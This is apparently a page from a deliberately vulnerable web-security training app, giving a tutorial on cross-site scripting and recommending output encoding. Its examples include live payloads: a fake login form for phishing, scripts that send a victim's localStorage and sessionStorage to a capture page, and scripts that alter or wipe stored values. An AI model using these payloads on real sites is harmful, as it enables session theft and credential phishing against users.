<?php
	/*
	 * @author: Jeremy Druin
	 */
?>

<div>&nbsp;</div>
<table class="tutorial">
	<tr class="tutorial-title">
		<td>Cross-Site Scripting Tutorial</td>
	</tr>
	<tr>
		<td>
			<br/>
			Cross-Site Scripting occurs because a script is displayed in page output but is not properly encoded.
			Because of the lack of proper encoding, the browser will execute the script rather than display it as data.
			Pages that encode all dynamic output are generally immune. The page will simply display the script as text
			rather than execute the script as code.		 
			<br/><br/>
			The first step to Cross-Site Scripting is to determine which of the sites input is displayed as output.
			Some input is immediately output on the same or next page. These pages are candidates for reflected 
			Cross-Site Scripting. Some input may be stored in a database and output later on the appropriate page.
			These situations may be ripe for the most dangerous type of XSS; persistent XSS.
			<br/><br/>
			Developers may treat input from forms carefully, while completely ignoring input passed via URL Query
			Parameters, Cookies, HTTP Headers, Logs, Emails, etc. The key is to encode ALL output and not just output
			that came into the site via forms/POST.
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>	
			Step 1: For each page under scrutiny, enter a unique string into each form field, 
			url query parameter, cookie value, HTTP Header, etc., record which value has which unique string, 
			submit the page, then observe the resulting page to see if any of your unique strings appeared. 
			Upon finding a unique string, note which value had contained that string and record this on your map.
			<br/><br/>
			Unfortunately the input could end up as output on any page within the site, all pages within the site, 
			or none of them. If the values are not reflected immediately but presented on a later page (for example
			in search results) then it should be assumed the value is stored in a database.   
			<br/><br/>
			Step 2:The second step is to test all the input locations from step #1 with various scripts, css, html tags, etc. 
			and observe the resulting output. If the site fails to encode output, it is a candidate for XSS.
			<br/><br/>
			Methodology: Enter interesting characters such as angle brackets for HTMLi and XSS, Cascading style 
			sheet symbols, etc. to see if the site encodes this output. If the site does not encode output, try 
			inserting XSS, CSS, HTML, etc. and watch for execution. If the site has a WAF, this is likely the point
			at which you will detect the WAF presence.
			<br/><br/>
			<span class="report-header">Examples</span>
			<br/><br/>	
			Many examples can be found at <a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>
			<br/><br/>
			This example is of stealing a cookie. This could be reflected or persistent. 
			To make this persistent, try to get the script stored into
			a database field which is later output onto a web page.
			<br/><br/>
			<?php 
				$lOutput1 = "<script>alert('Cookies which do not have the HTTPOnly attribute set: ' + document.cookie);</script>";	
				echo $Encoder->encodeForHTML($lOutput1);
			?>
			<br/><br/>
			Same example with the single-quotes escaped for databases such as MySQL. This allows the XSS to be stored in the database.
			When the web site (or another site) pulls the XSS from the database at a later time, it will be served with the 
			site content.
			<br /><br />
			<?php 
				$lOutput2 = "<script>alert(\'Cookies which do not have the HTTPOnly attribute set: \' + document.cookie);</script>";	
				echo $Encoder->encodeForHTML($lOutput2);
			?>
			<br/><br/>
			Cross site scripting will work in any unencoded output. It does not matter if the value being output
			initially came from a form field (usually POST) or URL parameteres (GET). If fact the value can come from any
			source. For example, if a web page outputs the user-agent string in whole or part, you can use a tool such 
			as User-Agent Switcher plug-in for Firefox to attempt XSS via the User-Agent HTTP Header. Any HTTP Header
			can be forged with or without tools. If you would like to forge an HTTP Header without tools, try Netcat. Other
			options include intercepting and changing the web request after the request leaves the browser. Burp Suite
			is an excellent tool to try on your own machine. Try changing the user-agent to the XSS examples on this page.
			Also, try this sample HTML injection. The XSS could be directly placed into the database then pulled later. This
			can happen from a hacked database, a rouge DBA, or via SQL injection such as with ASPROX. This is why output
			encoding is a better defense than input validation for XSS. If the XSS makes it into the database but never has
			to pass through the validation to get there, input validation will not work.
			<br/><br/>
			<?php 
				$lOutput1 = '<h1>Sorry. There has been a system error.<br /><br />Please login again</h1><br/>Username<input type="text"><br/>Password<input type="text"><br/><br/><input type="submit" value="Submit"><h1>&nbsp;</h1>';	
				echo $Encoder->encodeForHTML($lOutput1);
			?>

			<br/><br/>
			<span class="report-header">Steal DOM Storage values from another users browser (intermediate)</span>
			<br/><br/>	
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;for(i=0;i&lt;l.length;i++){
var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;}; 
document.location=&quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Steal DOM Storage values from another users browser (advanced)</span>
			<br/><br/>	
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; 
var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } 
for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } 
var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); 
lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); 
lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Add/Edit value to another users DOM storage</span>
			<br/><br/>	
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(m);}catch(e){alert(e.message);};
localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(m);}catch(e){alert(e.message);}&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Delete value from another users DOM storage</span>
			<br/><br/>	
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);};localStorage.clear();sessionStorage.clear();try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);}&lt;/script&gt;
</code>
		</td>
	</tr>
</table>
<div>&nbsp;</div>
